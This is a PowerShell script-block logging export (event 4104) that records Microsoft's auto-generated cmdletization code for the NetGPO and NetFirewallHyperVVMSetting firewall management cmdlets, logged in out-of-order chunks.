            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('PolicyStore')) {
          [object]$__cmdletization_value = ${PolicyStore}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PolicyStore'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('DomainController')) {
          [object]$__cmdletization_value = ${DomainController}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DomainController'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DomainController'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GPOSession'; ParameterType = 'System.String'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Open', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetGPO.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Open-NetGPO' -Alias '*'
        

function Save-NetGPO
{
    [CmdletBinding(PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='Save1', Mandatory=$true, Position=0)]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='Save1')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='Save1')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='Save1')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()

        [object]$__cmdletization_defaultValue = $null
        [object]$__cmdletization_defaultValueIsPresent = $false
        if ($PSBoundParameters.ContainsKey('GPOSession')) {
          [object]$__cmdletization_value = ${GPOSession}
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GPOSession'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Save', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetGPO.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Save-NetGPO' -Alias '*'
        


ScriptBlock ID: 53a8842f-2858-4e46-93b0-bced7753d7ec
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (3 of 3):
eratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DefaultOutboundAction')) {
            [object]$__cmdletization_value = ${DefaultOutboundAction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultOutboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('LoopbackEnabled')) {
            [object]$__cmdletization_value = ${LoopbackEnabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LoopbackEnabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LoopbackEnabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('AllowHostPolicyMerge')) {
            [object]$__cmdletization_value = ${AllowHostPolicyMerge}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowHostPolicyMerge'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowHostPolicyMerge'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVVMSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetFirewallHyperVVMSetting' -Alias '*'
        

function Remove-NetFirewallHyperVVMSetting
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVVMSetting')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('VMCreatorId')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVVMSetting')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVVMSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetFirewallHyperVVMSetting' -Alias '*'
        


ScriptBlock ID: cdab0656-a077-4f5e-b51b-05bcbd0a80eb
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (2 of 3):
poBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
        } else {
          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowHostPolicyMerge'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:CreateInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVVMSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'New-NetFirewallHyperVVMSetting' -Alias '*'
        

function Get-NetFirewallHyperVVMSetting
{
    [CmdletBinding(DefaultParameterSetName='GetAll', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVVMSetting')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('VMCreatorId')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetFirewallHyperVVMSetting.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetFirewallHyperVVMSetting' -Alias '*'
        

function Set-NetFirewallHyperVVMSetting
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallHyperVVMSetting')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('VMCreatorId')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByName')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetFirewallHyperVVMSetting')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${Enabled},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultInboundAction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultOutboundAction},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${LoopbackEnabled},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowHostPolicyMerge},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('Name', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('Enabled')) {
            [object]$__cmdletization_value = ${Enabled}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Enabled'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('DefaultInboundAction')) {
            [object]$__cmdletization_value = ${DefaultInboundAction}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DefaultInboundAction'; ParameterType = 'Microsoft.PowerShell.Cmdletization.Gen

ScriptBlock ID: cdab0656-a077-4f5e-b51b-05bcbd0a80eb
Path: "
"07-08-2025 18:31:35","4104","Warning","Creating Scriptblock text (1 of 3):

#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/standardcimv2/MSFT_NetFirewallHyperVVMSetting'
$script:ClassVersion = '1.0.0'
$script:ModuleVersion = '1.0.0.0'
$script:ObjectModelWrapper = [Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter]

$script:PrivateData = [System.Collections.Generic.Dictionary[string,string]]::new()

Microsoft.PowerShell.Core\Export-ModuleMember -Function @()
        

function __cmdletization_BindCommonParameters
{
    param(
        $__cmdletization_objectModelWrapper,
        $myPSBoundParameters
    )       
                

        if ($myPSBoundParameters.ContainsKey('CimSession')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['CimSession'].Value = $myPSBoundParameters['CimSession'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('ThrottleLimit')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['ThrottleLimit'].Value = $myPSBoundParameters['ThrottleLimit'] 
        }
                    

        if ($myPSBoundParameters.ContainsKey('AsJob')) { 
            $__cmdletization_objectModelWrapper.PSObject.Properties['AsJob'].Value = $myPSBoundParameters['AsJob'] 
        }
                    

}
                

function New-NetFirewallHyperVVMSetting
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    
    param(
    
    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('VMCreatorId')]
    [string]
    ${Name},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${Enabled},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultInboundAction},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Action]
    ${DefaultOutboundAction},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${LoopbackEnabled},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.GpoBoolean]
    ${AllowHostPolicyMerge},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='cim:CreateInstance0')]
    [switch]
    ${AsJob})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
